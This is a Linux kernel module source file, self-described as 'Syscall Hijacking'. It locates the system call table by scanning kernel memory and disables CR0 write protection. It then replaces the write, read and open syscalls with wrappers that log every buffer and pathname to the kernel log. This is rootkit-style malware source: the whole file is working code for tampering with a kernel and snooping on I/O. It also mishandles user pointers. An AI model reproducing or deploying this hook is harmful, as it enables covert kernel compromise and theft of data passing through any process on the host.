#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/delay.h>
#include <asm/paravirt.h>

MODULE_LICENSE( "GPL" );
MODULE_DESCRIPTION( "Syscall Hijacking" );

unsigned long	**sys_call_table;

asmlinkage int ( *original_write ) ( unsigned int, const char __user *, size_t );
asmlinkage int ( *original_read ) ( unsigned int, const char __user *, size_t );
asmlinkage int ( *original_open ) ( const char __user *, int, mode_t );

asmlinkage int	new_write( unsigned int fd, const char __user *buf, size_t count )
{
  printk( KERN_EMERG "write ===> %s\n", buf );
  return ( *original_write )( fd, buf, count );
}

asmlinkage int	new_read( unsigned int fd, const char __user *buf, size_t count )
{
  printk( KERN_EMERG "read ===> %s\n", buf );
  return ( *original_read )( fd, buf, count );
}

asmlinkage int	new_open( const char __user * pathname, int flags, mode_t mode )
{
  printk( KERN_EMERG "opened ===> %s\n", pathname );
  return ( *original_open )( pathname, flags, mode );
}

static void		aquire_sys_call_table( void )
{
  unsigned long int	offset;

  for ( offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof( void * ))
    {
      sys_call_table = ( unsigned long ** ) offset;
      if (sys_call_table[ __NR_close ] == ( unsigned long * ) sys_close) 
	break ;
    }
  printk( KERN_EMERG "Syscall Table Address: %p\n", sys_call_table );
}

static void	allow_writing( void )
{
  write_cr0( read_cr0() & ~0x10000 );
}

static void	disallow_writing( void )
{
  write_cr0( read_cr0() | 0x10000 );
}

static int	init_mod( void )
{
  aquire_sys_call_table();

  original_write = ( void * ) sys_call_table[ __NR_write ];
  original_read = ( void * ) sys_call_table[ __NR_read ];
  original_open = ( void * ) sys_call_table[ __NR_open ];
  allow_writing();
  sys_call_table[ __NR_write ] = ( unsigned long * ) new_write;
  sys_call_table[ __NR_read ] = ( unsigned long * ) new_read;
  sys_call_table[ __NR_open ] = ( unsigned long * ) new_open;
  disallow_writing();

  return 0;
}

static void	exit_mod( void )
{
  allow_writing();
  sys_call_table[ __NR_write ] = ( unsigned long * ) original_write;
  sys_call_table[ __NR_read ] = ( unsigned long * ) original_read;
  sys_call_table[ __NR_open ] = ( unsigned long * ) original_open;
  disallow_writing();
}

module_init( init_mod );
module_exit( exit_mod );